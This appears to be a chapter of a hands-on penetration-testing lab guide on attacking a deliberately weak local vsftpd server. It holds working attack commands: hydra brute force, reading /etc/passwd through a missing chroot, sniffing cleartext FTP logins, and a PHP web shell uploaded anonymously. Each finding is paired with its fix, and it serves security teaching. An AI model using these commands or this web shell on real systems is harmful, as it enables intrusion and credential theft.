@@ -1,0 +1,46 @@
+<?xml version='1.0' encoding='utf-8'?>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta charset="utf-8"/>
+<title>Session 5: The FTP Box</title>
+<link rel="stylesheet" type="text/css" href="../styles.css"/>
+</head>
+<body>
+<h1>Session 5: The FTP Box</h1>
+<p>Goal for this session: pivot off the web application entirely and work the vsftpd server on <code>127.0.0.1:21</code>. Four findings here, anonymous write, weak credentials, no chroot jail, cleartext authentication, and this is also where you set up the chained exploit that Session 6 finishes. ZAP has nothing to say about any of it; the tools change to nmap, an FTP client, hydra, and Wireshark.</p>
+<h2>5.1 Fingerprint the Service</h2>
+<pre>nmap -sV -sC -p21,21100-21110 127.0.0.1</pre>
+<p>The service scripts alone will tell you anonymous login is allowed. Note the version and the passive port range; you will need passive mode for every transfer because the server sits behind Docker's NAT.</p>
+<h2>5.2 Anonymous Login with Write Access</h2>
+<p>Anonymous users land in a read-only root with a world-writable <code>upload/</code> subdirectory. That is a deliberate detail, vsftpd refuses to serve a writable chroot root, so the writable bit is on the subdirectory, which is exactly how a lot of real misconfigurations end up looking.</p>
+<pre>echo "test" &gt; note.txt
+curl -s --ftp-pasv -T note.txt ftp://127.0.0.1/upload/note.txt
+curl -s --ftp-pasv ftp://127.0.0.1/upload/note.txt        # reads back</pre>
+<p>The fix is to disable anonymous login, or, if a business case truly requires it, make it read-only and keep it out of any directory another service serves.</p>
+<h2>5.3 Weak Service Credentials</h2>
+<p>The service account is <code>ftpuser:ftpuser</code>. Confirm it by hand, then, if you are teaching credential attacks, let hydra find it:</p>
+<pre>curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/
+hydra -l ftpuser -P rockyou.txt ftp://127.0.0.1</pre>
+<p>The fix is that no default credential ships, and service accounts get a real password policy or key-based access.</p>
+<h2>5.4 No Chroot Jail</h2>
+<p><code>chroot_local_user</code> is off, so <code>ftpuser</code> is not confined to a home directory. After login, the whole container filesystem is reachable.</p>
+<pre>lftp -u ftpuser,ftpuser 127.0.0.1 -e 'set ftp:passive-mode on; cd /; ls; cd /etc; cat passwd; bye'</pre>
+<p>You are reading <code>/etc/passwd</code>, the vsftpd config, anything the FTP user can reach. From here you can also <code>cd /srv/ftp/upload</code>, the shared directory, and drop files for the web side. The fix is a correctly owned, non-writable chroot target, verified against a fresh config rather than patched into an old one.</p>
+<h2>5.5 Cleartext Credentials</h2>
+<p>There is no FTPS. The control channel is plaintext. Capture a login on the loopback interface:</p>
+<pre>sudo tcpdump -i lo0 -A 'tcp port 21' &amp;
+curl -s --ftp-pasv -u ftpuser:ftpuser ftp://127.0.0.1/ &gt;/dev/null</pre>
+<p>Read <code>USER ftpuser</code> and <code>PASS ftpuser</code> straight off the wire. Do the same in Wireshark with an <code>ftp</code> display filter so trainees see the protocol laid out. The fix is FTPS, forced for both the login and the data channel, or moving to SFTP entirely.</p>
+<h2>5.6 Set Up the Chain</h2>
+<p>The anonymous upload directory, <code>/srv/ftp/upload</code>, is the same volume Apache serves at <code>/uploads/ftp/</code>, and PHP executes there. Upload a web shell anonymously and leave it. You will fire it in Session 6.</p>
+<pre>printf '&lt;?php echo shell_exec($_GET["c"]);' &gt; s.php
+curl -s --ftp-pasv -T s.php ftp://127.0.0.1/upload/s.php</pre>
+<h2>5.7 A Lab Honesty Note</h2>
+<blockquote>
+<p>vsftpd's anonymous path segfaults roughly once in a few hundred connections on this Alpine build under a fast scanner. The container restarts itself in about a second, and normal use, a handful of FTP commands per exercise, will not trigger it. If a burst of automated connections briefly drops the service, that is the known quirk, not your attack working. It is written up in <code>docs/architecture.md</code>.</p>
+</blockquote>
+<h2>5.8 What You Should Notice</h2>
+<p>None of these four are clever. Anonymous write, a default password, a missing jail, no encryption, they are the FTP findings from twenty years ago, still shipping. The reason this session exists is the pivot: a finding on one service (anonymous write) plus a finding on another (the web side executes uploads) is worth far more than the sum, and no single scanner pointed at either service would have told you so. Chaining is the next session.</p>
+</body>
+</html>
